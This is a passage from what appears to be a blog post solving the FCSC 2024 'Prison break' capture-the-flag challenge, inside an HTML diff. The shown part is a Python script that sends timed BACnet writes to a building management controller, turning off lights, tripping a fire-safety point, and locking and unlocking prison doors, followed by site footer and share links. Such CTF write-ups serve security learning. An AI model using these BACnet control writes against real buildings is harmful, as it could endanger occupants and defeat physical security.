+</span></span><span style="display:flex;"><span>print(Fore<span style="color:#f92672">.</span>YELLOW <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Checkpoint 4 - Extinction lumières EST/centre, ouverture cellule Carlos et porte EST&#34;</span>)
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 48 presentValue inactive&#34;</span>) <span style="color:#75715e">#&#39;lumiere_est&#39;, </span>
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 51 presentValue inactive&#34;</span>) <span style="color:#75715e">#&#39;lumiere_centre&#39;, </span>
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 19 presentValue active&#34;</span>) <span style="color:#75715e">#&#39;porte_est_10&#39;, </span>
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 22 presentValue active&#34;</span>) <span style="color:#75715e">#&#39;porte_est_principale&#39;, </span>
+</span></span><span style="display:flex;"><span>elapsed_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> start_time
+</span></span><span style="display:flex;"><span>remaining_time <span style="color:#f92672">=</span> (<span style="color:#ae81ff">20</span> <span style="color:#f92672">-</span> elapsed_time)
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(remaining_time)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Checkpoint 5 (t4+5s) </span>
+</span></span><span style="display:flex;"><span>start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>print(Fore<span style="color:#f92672">.</span>YELLOW <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Checkpoint 5 - Enfermement de Carlos dans le poste de contrôle 2&#34;</span>)
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 38 presentValue inactive&#34;</span>)<span style="color:#75715e">#&#39;porte_garde_3&#39;, </span>
+</span></span><span style="display:flex;"><span>elapsed_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> start_time
+</span></span><span style="display:flex;"><span>remaining_time <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">-</span> elapsed_time
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(remaining_time)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Checkpoint 6 (t5+15s)</span>
+</span></span><span style="display:flex;"><span>start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>print(Fore<span style="color:#f92672">.</span>YELLOW <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Checkpoint 6 - Déclenchement sécurité incendie SAS, extinction lumière avant-poste, enfermement garde&#34;</span>) 
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 46 presentValue active&#34;</span>)<span style="color:#75715e">#&#39;sec_incendie_garde&#39;,</span>
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 50 presentValue inactive&#34;</span>)<span style="color:#75715e">#&#39;lumiere_garde&#39;, </span>
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 36 presentValue inactive&#34;</span>)<span style="color:#75715e">#&#39;porte_garde_1&#39;,</span>
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 42 presentValue inactive&#34;</span>)<span style="color:#75715e">#&#39;&#39;porte_garde_principale&#39;, &#39;,</span>
+</span></span><span style="display:flex;"><span>remaining_time <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">9</span> <span style="color:#f92672">-</span> elapsed_time
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(remaining_time)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Checkpoint 7 (t6+10s)</span>
+</span></span><span style="display:flex;"><span>print(Fore<span style="color:#f92672">.</span>YELLOW <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Checkpoint 7 - Libération de Carlos et ouverture des portes finales&#34;</span>)
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 38 presentValue active&#34;</span>)<span style="color:#75715e">#&#39;porte_garde_3&#39;, </span>
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 40 presentValue active&#34;</span>)<span style="color:#75715e">#&#39;porte_garde_5&#39;, </span>
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 41 presentValue active&#34;</span>)<span style="color:#75715e">#&#39;porte_garde_6&#39;, </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">10</span>)
+</span></span></code></pre></div><p>Visual web interface:
+<img src="/images/FCSC2024/7b30b73ebf50e508fe5962b23733a6e3.png" alt="image"></p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+        <li><a href="../../index.html">Home</a></li>
+    
+        <li><a href="../index.html">Categories</a></li>
+      
+        <li><a href="../../ranking/index.html">Ranking</a></li>
+      
+        <li><a href="../../whoami/index.html">Whoami</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#prison-break-12">Prison break 1/2</a></li>
+    <li><a href="#prison-break-22">Prison break 2/2</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&text=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&title=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&is_video=false&description=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc&body=Check out this article: https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&title=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&title=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&name=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc&description=Introduction%20Carlos%2c%20obviously%20innocent%2c%20is%20locked%20up%20in%20a%20high-security%20prison.%20The%20prison%26rsquo%3bs%20building%20management%20system%20%28BMS%29%20is%20controlled%20by%20a%20programmable%20logic%20controller%20%28PLC%29.%20Access%20to%20this%20PLC%20was%20made%20possible%20by%20an%20implant%20concealed%20during%20a%20previous%20operation%2c%20which%20can%20be%20accessed%20from%20outside%20the%20prison%20via%20%28UDP%20protocol%29%3a%0anc%20-u%20prison-break.france-cybersecurity-challenge.fr%2047808%0aSimilarly%2c%20read-only%20access%20to%20the%20scada%20supervision%20interface%20is%20possible%20from%20%3a%0ahttps%3a%2f%2fprison-break.france-cybersecurity-challenge.fr%2f%0aTo%20help%20Carlos%20escape%2c%20follow%20the%20instructions%20for%20the%20following%20checkpoints%20carefully%3a" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&t=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  Imad 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="../../index.html">Home</a></li>
+    
+        <li><a href="../index.html">Categories</a></li>
+      
+        <li><a href="../../ranking/index.html">Ranking</a></li>
+      
+        <li><a href="../../whoami/index.html">Whoami</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+
+
+
+</html>
